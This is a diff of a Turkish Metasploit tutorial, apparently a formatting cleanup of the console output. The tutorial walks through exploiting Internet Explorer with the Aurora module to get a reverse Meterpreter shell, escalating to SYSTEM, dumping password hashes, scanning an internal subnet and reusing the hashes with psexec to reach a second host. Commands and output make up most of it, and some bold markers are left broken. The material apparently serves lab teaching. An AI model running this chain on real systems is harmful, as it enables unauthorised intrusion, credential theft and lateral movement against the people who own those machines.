@@ -39,7 +39,7 @@ Burada kullanılan `exploit/windows/browser/ms10_002_aurora` modülü sayesinde,
 
 ```bash
 msf > use exploit/windows/browser/ms10_002_aurora 
-msf exploit**(**ms10_002_aurora**)** > show options
+msf exploit(ms10_002_aurora) > show options
 
 Module options:
 
@@ -47,9 +47,9 @@ Module options:
    ----        ---------------  --------  -----------
    SRVHOST     0.0.0.0          yes       The local host to listen on.
    SRVPORT     8080             yes       The local port to listen on.
-   SSL         false            no        Negotiate SSL **for **incoming connections
-   SSLVersion  SSL3             no        Specify the version of SSL that should be used **(**accepted: SSL2, SSL3, TLS1**)**
-   URIPATH                      no        The URI to use **for **this exploit **(**default is random**)**
+   SSL         false            no        Negotiate SSL for **incoming connections
+   SSLVersion  SSL3             no        Specify the version of SSL that should be used (accepted: SSL2, SSL3, TLS1)
+   URIPATH                      no        The URI to use for **this exploit (default is random)
 
 
 Exploit target:
@@ -59,20 +59,20 @@ Exploit target:
    0   Automatic
 
 
-msf exploit**(**ms10_002_aurora**)** > set URIPATH /
-URIPATH **=>** /
-msf exploit**(**ms10_002_aurora**)** > set PAYLOAD windows/meterpreter/reverse_tcp
-PAYLOAD **=>** windows/meterpreter/reverse_tcp
-msf exploit**(**ms10_002_aurora**)** > set LHOST 192.168.1.101
-LHOST **=>** 192.168.1.101
-msf exploit**(**ms10_002_aurora**)** > exploit -j
+msf exploit(ms10_002_aurora) > set URIPATH /
+URIPATH => /
+msf exploit(ms10_002_aurora) > set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD => windows/meterpreter/reverse_tcp
+msf exploit(ms10_002_aurora) > set LHOST 192.168.1.101
+LHOST => 192.168.1.101
+msf exploit(ms10_002_aurora) > exploit -j
 > Exploit running as background job.
 
 > Started reverse handler on 192.168.1.101:4444 
 > Using URL: <a href="http://0.0.0.0:8080/">http://0.0.0.0:8080/</a>
 >  Local IP: <a href="http://192.168.1.101:8080/">http://192.168.1.101:8080/</a>
 > Server started.
-msf exploit**(**ms10_002_aurora**)** >
+msf exploit(ms10_002_aurora) >
 ```
 
 
@@ -81,12 +81,12 @@ Açılan yeni oturumu `sessions -l` komutuyla görebilirsiniz. Aşağıdaki list
 
 
 ```bash
-msf exploit**(**ms10_002_aurora**)** > 
+msf exploit(ms10_002_aurora) > 
 > Sending Internet Explorer "Aurora" Memory Corruption to client 192.168.1.201
-> Sending stage **(**749056 bytes**)** to 192.168.1.201
-> Meterpreter session 1 opened **(**192.168.1.101:4444 -> 192.168.1.201:8777**)** at Mon Dec 06 08:22:29 -0700 2010
+> Sending stage (749056 bytes) to 192.168.1.201
+> Meterpreter session 1 opened (192.168.1.101:4444 -> 192.168.1.201:8777) at Mon Dec 06 08:22:29 -0700 2010
 
-msf exploit**(**ms10_002_aurora**)** > sessions -l
+msf exploit(ms10_002_aurora) > sessions -l
 
 Active sessions
 **===============**
@@ -95,7 +95,7 @@ Active sessions
   --  ----                   -----------                                      ----------
   1   meterpreter x86/win32  XEN-XP-SP2-BARE\Administrator @ XEN-XP-SP2-BARE  192.168.1.101:4444 -> 192.168.1.201:8777
 
-msf exploit**(**ms10_002_aurora**)** >
+msf exploit(ms10_002_aurora) >
 ```
 
 
@@ -108,7 +108,7 @@ msf exploit**(**ms10_002_aurora**)** >
 
 
 ```bash
-msf exploit**(**ms10_002_aurora**)** > sessions -i 1
+msf exploit(ms10_002_aurora) > sessions -i 1
 > Starting interaction with 1...
 
 meterpreter > ipconfig
@@ -234,7 +234,7 @@ Aşağıdaki komutlarla, `getsystem` ile SYSTEM bilgilerini elde ediyoruz, `hash
 
 ```bash
 meterpreter > getsystem
-...got system **(**via technique 1**)**.
+...got system (via technique 1).
 
 meterpreter > run hashdump
 > Obtaining the boot key...
@@ -253,7 +253,7 @@ victim:1004:81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d:::
 
 meterpreter > 
 Background session 1? **[**y/N]  
-msf exploit**(**ms10_002_aurora**)** >
+msf exploit(ms10_002_aurora) >
 ```
 
 
@@ -266,39 +266,39 @@ Rotalama sayesinde artık 2. bilgisayar ağı ile haberleşebiliyoruz. O zaman b
 
 
 ```bash
-msf exploit**(**ms10_002_aurora**)** > use auxiliary/scanner/portscan/tcp 
-msf auxiliary**(**tcp**)** > show options
+msf exploit(ms10_002_aurora) > use auxiliary/scanner/portscan/tcp 
+msf auxiliary(tcp) > show options
 
 Module options:
 
    Name         Current Setting  Required  Description
    ----         ---------------  --------  -----------
    CONCURRENCY  10               yes       The number of concurrent ports to check per host
-   FILTER                        no        The filter string **for **capturing traffic
+   FILTER                        no        The filter string for **capturing traffic
    INTERFACE                     no        The name of the interface
    PCAPFILE                      no        The name of the PCAP capture file to process
-   PORTS        1-10000          yes       Ports to scan **(**e.g. 22-25,80,110-900**)**
+   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
    RHOSTS                        yes       The target address range or CIDR identifier
    SNAPLEN      65535            yes       The number of bytes to capture
    THREADS      1                yes       The number of concurrent threads
    TIMEOUT      1000             yes       The socket connect timeout **in **milliseconds
    VERBOSE      false            no        Display verbose output
 
-msf auxiliary**(**tcp**)** > set RHOSTS 10.1.13.0/24
-RHOST **=>** 10.1.13.0/24
-msf auxiliary**(**tcp**)** > set PORTS 139,445
-PORTS **=>** 139,445
-msf auxiliary**(**tcp**)** > set THREADS 50
-THREADS **=>** 50
-msf auxiliary**(**tcp**)** > run
+msf auxiliary(tcp) > set RHOSTS 10.1.13.0/24
+RHOST => 10.1.13.0/24
+msf auxiliary(tcp) > set PORTS 139,445
+PORTS => 139,445
+msf auxiliary(tcp) > set THREADS 50
+THREADS => 50
+msf auxiliary(tcp) > run
 
 > 10.1.13.3:139 - TCP OPEN
 > 10.1.13.3:445 - TCP OPEN
 > 10.1.13.2:445 - TCP OPEN
 > 10.1.13.2:139 - TCP OPEN
-> Scanned 256 of 256 hosts **(**100% complete**)**
+> Scanned 256 of 256 hosts (100% complete)
 > Auxiliary module execution completed
-msf auxiliary**(**tcp**)** >
+msf auxiliary(tcp) >
 ```
 
 
@@ -315,8 +315,8 @@ Yapılan tarama sonucunda `10.1.13.2` ve `10.1.13.3` olarak 2 IP adresi bulduk. 
 
 
 ```bash
-msf auxiliary**(**tcp**)** > use exploit/windows/smb/psexec 
-msf exploit**(**psexec**)** > show options
+msf auxiliary(tcp) > use exploit/windows/smb/psexec 
+msf exploit(psexec) > show options
 
 Module options:
 
@@ -324,8 +324,8 @@ Module options:
    ----       ---------------  --------  -----------
    RHOST                       yes       The target address
    RPORT      445              yes       Set the SMB service port
-   SMBDomain  WORKGROUP        no        The Windows domain to use **for **authentication
-   SMBPass                     no        The password **for **the specified username
+   SMBDomain  WORKGROUP        no        The Windows domain to use for **authentication
+   SMBPass                     no        The password for the specified username
    SMBUser                     no        The username to authenticate as
 
 
@@ -336,19 +336,19 @@ Exploit target:
    0   Automatic
 
 
-msf exploit**(**psexec**)** > set RHOST 10.1.13.2
-RHOST **=>** 10.1.13.2
+msf exploit(psexec) > set RHOST 10.1.13.2
+RHOST => 10.1.13.2
 
-msf exploit**(**psexec**)** > set SMBUser Administrator
-SMBUser **=>** Administrator
+msf exploit(psexec) > set SMBUser Administrator
+SMBUser => Administrator
 
-msf exploit**(**psexec**)** > set SMBPass 81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d
-SMBPass **=>** 81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d
+msf exploit(psexec) > set SMBPass 81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d
+SMBPass => 81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d
 
-msf exploit**(**psexec**)** > set PAYLOAD windows/meterpreter/bind_tcp
-PAYLOAD **=>** windows/meterpreter/bind_tcp
+msf exploit(psexec) > set PAYLOAD windows/meterpreter/bind_tcp
+PAYLOAD => windows/meterpreter/bind_tcp
 
-msf exploit**(**psexec**)** > exploit
+msf exploit(psexec) > exploit
 
 > Connecting to the server...
 > Started bind handler
@@ -358,15 +358,15 @@ msf exploit**(**psexec**)** > exploit
 > Binding to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:10.1.13.2[\svcctl] ...
 > Bound to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:10.1.13.2[\svcctl] ...
 > Obtaining a service manager handle...
-> Creating a new service **(**UOtrbJMd - "MNYR"**)**...
+> Creating a new service (UOtrbJMd - "MNYR")...
 > Closing service handle...
 > Opening service...
 > Starting the service...
 > Removing the service...
 > Closing service handle...
 > Deleting \qNuIKByV.exe...
-> Sending stage **(**749056 bytes**)**
-> Meterpreter session 2 opened **(**192.168.1.101-192.168.1.201:0 -> 10.1.13.2:4444**)** at Mon Dec 06 08:56:42 -0700 2010
+> Sending stage (749056 bytes)
+> Meterpreter session 2 opened (192.168.1.101-192.168.1.201:0 -> 10.1.13.2:4444) at Mon Dec 06 08:56:42 -0700 2010
 
 meterpreter >
 ```
